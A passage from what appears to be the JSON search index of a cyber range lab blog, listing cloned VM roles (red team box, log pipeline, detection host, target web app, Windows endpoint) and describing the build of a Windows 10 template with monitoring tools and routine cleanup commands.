base-ubuntu-2204-template opf-ai01 ML/AI detection modeling base-ubuntu-2204-template opf-cloud01 Web app target in DMZRED base-windows10-template opf-mbr01 Domain-joined endpoint (Win10) üß† Notes Hostnames and static IPs are applied per segment Each VM is configured with dedicated virtual NICs Cloning process preserves snapshot state and configuration integrity ","permalink":"https://opforge.dev/posts/opf-clone-map/","summary":"\u003ch2 id=\"-cloned-vms-in-the-opforge-lab\"\u003eüîÅ Cloned VMs in the OPFORGE Lab\u003c/h2\u003e\n\u003cp\u003eThe following VMs are derived from the base templates and customized for their operational roles.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone\u003c/th\u003e\n          \u003cth\u003eRole Description\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-red01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eRed Team operator + C2 lab\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-log01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eLog ingestion + OpenSearch stack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-ai01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eML/AI detection modeling\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eWeb app target in DMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-mbr01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint (Win10)\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-notes\"\u003eüß† Notes\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eHostnames and static IPs are applied per segment\u003c/li\u003e\n\u003cli\u003eEach VM is configured with dedicated virtual NICs\u003c/li\u003e\n\u003cli\u003eCloning process preserves snapshot state and configuration integrity\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE VM Clone Map"},{"content":"Clone Map Template Clone Name Purpose base-ubuntu-2204-template opf-red01 Red Team operator box base-ubuntu-2204-template opf-log01 Log pipeline (Zeek, OpenSearch) base-ubuntu-2204-template opf-ai01 Jupyter + anomaly detection base-ubuntu-2204-template opf-cloud01 Targeted web app for attack base-windows10-template opf-mbr01 Domain-joined endpoint Lessons Learned Clone from snapshot, then personalize (hostname, NIC, IP) Use base templates with all dependencies pre-installed Maintain consistency across VM builds using scripting and snapshots ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/","summary":"\u003ch2 id=\"clone-map\"\u003eClone Map\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone Name\u003c/th\u003e\n          \u003cth\u003ePurpose\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003eRed Team operator box\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003eLog pipeline (Zeek, OpenSearch)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-ai01\u003c/td\u003e\n          \u003ctd\u003eJupyter + anomaly detection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-cloud01\u003c/td\u003e\n          \u003ctd\u003eTargeted web app for attack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eClone from snapshot, then personalize (hostname, NIC, IP)\u003c/li\u003e\n\u003cli\u003eUse base templates with all dependencies pre-installed\u003c/li\u003e\n\u003cli\u003eMaintain consistency across VM builds using scripting and snapshots\u003c/li\u003e\n\u003c/ul\u003e","title":"Scaling OPFORGE: How I Clone and Manage Cyber Range VMs"},{"content":"This post documents the process of building and finalizing the Windows 10 Pro 22H2 template for use in the OPFORGE cyber lab environment.\nüõ†Ô∏è Version \u0026amp; Baseline OS: Windows 10 Pro 22H2 (fully patched as of 2025-05-25) Build Source: Clean ISO install (22H2), upgraded from legacy 10240 Purpose: Golden template for domain-joined endpoint clones (opf-mbr01, future victim hosts) üì¶ Tool Installation via Script After installation and patching, the following tools were installed using the custom script:\nInstall-OPFORGE-WindowsTools.ps1 Tools Installed: Sysmon Winlogbeat 7zip VSCode Notepad++ Sysinternals Suite Wireshark Autoruns Process Explorer üîê System Hardening Included in the setup:\nRemoval of bloatware and telemetry Disabling Cortana, Xbox services, OneDrive Clean Start Menu layout Chocolatey configured for repeat installs üßΩ Final Cleanup \u0026amp; Snapshot Prior to cloning or Sysprep:\ncleanmgr /sagerun:1 powercfg -h off Snapshot taken:\nbase-windows10-template - win10_22H2_tools_installed\n‚úÖ Status This image is ready to be cloned into production boxes like:\nopf-mbr01 Future detection test targets Domain-joined Windows clients For installation automation, refer to: Install-OPFORGE-WindowsTools.ps1\n","permalink":"https://opforge.dev/posts/windows-setup/","summary":"\u003cp\u003eThis post documents the process of building and finalizing the \u003cstrong\u003eWindows 10 Pro 22H2\u003c/strong\u003e template for use in the OPFORGE cyber lab environment.\u003c/p\u003e\n\u003ch2 id=\"-version--baseline\"\u003eüõ†Ô∏è Version \u0026amp; Baseline\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched as of 2025-05-25)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuild Source\u003c/strong\u003e: Clean ISO install (22H2), upgraded from legacy 10240\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePurpose\u003c/strong\u003e: Golden template for domain-joined endpoint clones (\u003ccode\u003eopf-mbr01\u003c/code\u003e, future victim hosts)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-tool-installation-via-script\"\u003eüì¶ Tool Installation via Script\u003c/h2\u003e\n\u003cp\u003eAfter installation and patching, the following tools were installed using the custom script:\u003c/p\u003e","title":"Windows 10 Template Setup for OPFORGE"}]